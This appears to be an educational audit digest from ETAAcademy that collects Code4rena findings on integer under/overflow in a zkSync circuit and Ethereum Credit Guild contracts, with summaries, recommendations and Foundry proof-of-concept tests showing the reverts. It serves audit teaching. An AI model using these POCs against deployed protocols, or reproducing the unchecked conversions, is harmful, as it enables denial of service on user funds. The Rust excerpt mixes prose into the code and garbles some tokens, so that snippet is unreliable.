# ETAAcademy-Adudit: 2. Under/Overflow

<table>
  <tr>
    <th>title</th>
    <th>tags</th>
  </tr>
  <tr>
    <td>02. Under/Overflow</td>
    <td>
      <table>
        <tr>
          <th>audit</th>
          <th>basic</th>
          <th>math</th>
          <td>under/overflow</td>
        </tr>
      </table>
    </td>
  </tr>
</table>

[Github](https://github.com/ETAAcademy)｜[Twitter](https://twitter.com/ETAAcademy)｜[ETA-Audit](https://github.com/ETAAcademy/ETAAcademy-Audit)

Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining

## 1.[High] Reduction gate in binop operation is unsafe

### Lack of overflow check

- Summary: This method converts a constraint system variable (representing a value in the prime field) directly into a **`UInt8`** value without performing any overflow checks.

- Impact & Recommendation: This means that if the original value exceeds the range of **`UInt8`** (0 to 255), an attacker could inject unexpected or malicious behavior into the circuit by manipulating the overflowed **`xor_result`**.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-10-zksync#h-05-reduction-gate-in-binop-operation-is-unsafe) & [Report](https://code4rena.com/reports/2023-10-zksync)

  <details><summary>POC</summary>

  ```rust

    let mut composite_result = [Variable::placeholder(); 32];
    for ((a, b), dst) in a.iter().zip(b.iter()).zip(composite_result.iter_mut()) {
        let [result] = cs.perform_lookup::<2, 1>(table_id, &[a.get_variable(), b.get_variable()]);
        *dst = result;
    }

    At first, we perform a lookup to get the composite result for and, or and xor.


    for (src, decomposition) in composite_result.iter().zip(all_results.array_chunks::<3>()) {
        if cs.gate_is_allowed::<ReductionGate<F, 4>>() {
            let mut gate = ReductionGate::<F, 4>::empty();
            gate.params = ReductionGateParams {
                reduction_constants: [F::SHIFTS[0], F::SHIFTS[16], F::SHIFTS[32], F::ZERO],
            };
            gate.reduction_result = *src;
            gate.terms = [
                decomposition[0],
                decomposition[1],
                decomposition[2],
                zero_var,
            ];
            gate.add_to_cs(cs);
        }


    for (((and, or), xor), src) in and_results
    .iter_mut()
    .zip(or_results.iter_mut())
    .zip(xor_results.iter_mut())
    .zip(all_results.array_chunks::<3>())
    {
    *and = src[0];
    *or = src[1];
    \*xor = src[2];
    }
    let and_results = and_results.map(|el| unsafe { UInt8::from_variable_unchecked(el) });
    let or_results = or_results.map(|el| unsafe { UInt8::from_variable_unchecked(el) });
    let xor_results = xor_results.map(|el| unsafe { UInt8::from_variable_unchecked(el) });
    Finally, we get three separate results from all_results.



    for source*set in all_results.array_chunks::<3>() {
    // value is irrelevant, it's just a range check
    let *: [Variable; 1] = cs.perform_lookup::<2, 1>(table_id, &[source_set[0], source_set[1]]);
    }


  ```

</details>

## 2.[Medium] TotalBorrowedCredit can revert, breaking gauges.

### CreditMultiplier affect totalBorrowedCredit

- Summary: Changes in the creditMultiplier can cause issues in the totalBorrowedCredit function, potentially leading to reverting due to underflow. This affects debt ceiling calculations and can break borrow operations, impacting functionality.

- Impact & Recommendation: To prevent failures, either cap totalBorrowedCredit at 0 or track total tokens minted and burned by the PSM module to remove dependence on creditMultiplier.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-12-ethereumcreditguild#m-03-totalborrowedcredit-can-revert-breaking-gauges) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity

    function testAttackRevert() public {
    // grant roles to test contract
    vm.startPrank(governor);
    core.grantRole(CoreRoles.GAUGE_PNL_NOTIFIER, address(this));
    core.grantRole(CoreRoles.CREDIT_MINTER, address(this));
    vm.stopPrank();
    emit log_named_uint('TBC 1', profitManager.totalBorrowedCredit());
    // psm mint 100 CREDIT
    pegToken.mint(address(this), 100e6);
    pegToken.approve(address(psm), 100e6);
    psm.mint(address(this), 100e6);
    emit log_named_uint('TBC 2', profitManager.totalBorrowedCredit());
    // apply a loss
    // 50 CREDIT of loans completely default (50 USD loss)
    profitManager.notifyPnL(address(this), -50e18);
    emit log_named_uint('TBC 3', profitManager.totalBorrowedCredit());
    // burn tokens to throw off the ratio
    credit.burn(70e18);
    vm.expectRevert();
    emit log_named_uint('TBC 4', profitManager.totalBorrowedCredit());
    }


  ```

  </details>

## 2.[Medium] PnL system can be broken by large users intentionally or unintentionally.

### CreditMultiplier affected by `creditTotalSupply - loss < 0`

- Summary: The notifyPnL function in ProfitManager.sol calculates the credit multiplier based on creditTotalSupply minus loss. If the loss exceeds creditTotalSupply, it causes a revert, breaking gauge slashing and voting systems.

- Impact & Recommendation: Excessive losses cause gauge vote slashing, decrease the creditMultiplier, and disrupt the auction process. If the loss exceeds creditTotalSupply, setting the creditMultiplier to 0 prevents system breakdown.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-12-ethereumcreditguild#m-04-pnl-system-can-be-broken-by-large-users-intentionally-or-unintentionally) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity

    function testAttackBid() public {
    bytes32 loanId = _setupAndCallLoan();
    uint256 PHASE_1_DURATION = auctionHouse.midPoint();
    uint256 PHASE_2_DURATION = auctionHouse.auctionDuration() - auctionHouse.midPoint();
    vm.roll(block.number + 1);
    vm.warp(block.timestamp + PHASE_1_DURATION + (PHASE_2_DURATION * 2) / 3);
    // At this time, get full collateral, repay half debt
    (uint256 collateralReceived, uint256 creditAsked) = auctionHouse.getBidDetail(loanId);
    emit log_named_uint('collateralReceived', collateralReceived);
    emit log_named_uint('creditAsked', creditAsked);
    vm.startPrank(borrower);
    credit.burn(20_000e18);
    vm.stopPrank();
    // bid
    credit.mint(bidder, creditAsked);
    vm.startPrank(bidder);
    credit.approve(address(term), creditAsked);
    vm.expectRevert();
    auctionHouse.bid(loanId);
    vm.stopPrank();
    }

  ```

  </details>

## 3.[Medium] Rounding errors can cause ERC20RebaseDistributor transfers and mints to fail for underflow

### Underflow by rounding errors

- Summary: Rounding issues in ERC20RebaseDistributor can cause transfers to fail if there's a discrepancy in share calculations. This can be exploited to disrupt operations like liquidations, as affected addresses cannot exit rebase to fix transfers.

- Impact & Recommendation: Transfers and mints involving rebasing addresses may fail. To fix this, consider adjusting share calculations to tolerate rounding fluctuations, like flooring the relevant subtractions to 0.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-12-ethereumcreditguild#m-23-rounding-errors-can-cause-erc20rebasedistributor-transfers-and-mints-to-fail-for-underflow) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity

    function testM2bis() external {
        uint t0 = block.timestamp;
        // set up the credit token with the minimum 100e18 rebasing supply
        // as indicated here ->

        ct.mint(address(1), 100e18);
        vm.prank(address(1));
        ct.enterRebase();

        ct.mint(address(2), 6e11); vm.prank(address(2)); ct.distribute(6e11);
        vm.warp(2);
        ct.mint(address(2), 3e12); vm.prank(address(2)); ct.distribute(3e12);
        vm.warp(3);

        ct.mint(address(3), 1e20);
        vm.prank(address(3));
        // ☢️ this shouldn't revert!
        vm.expectRevert();
        ct.transfer(address(1), 1e20);
        // ☢️ this shouldn't either!
        vm.expectRevert();
        ct.mint(address(1), 1e20);
        // ☢️ this too..
        vm.prank(address(1));
        vm.expectRevert();
        ct.exitRebase();
        // ☢️ same here...
        vm.startPrank(address(1));
        vm.expectRevert();
        ct.transfer(address(3), 1e20);
        // ☢️ I bet you saw this coming...
        ct.approve(address(3), 1e20);
        vm.startPrank(address(3));
        vm.expectRevert();
        ct.transferFrom(address(1), address(3), 1e20);
    }

  ```

  </details>
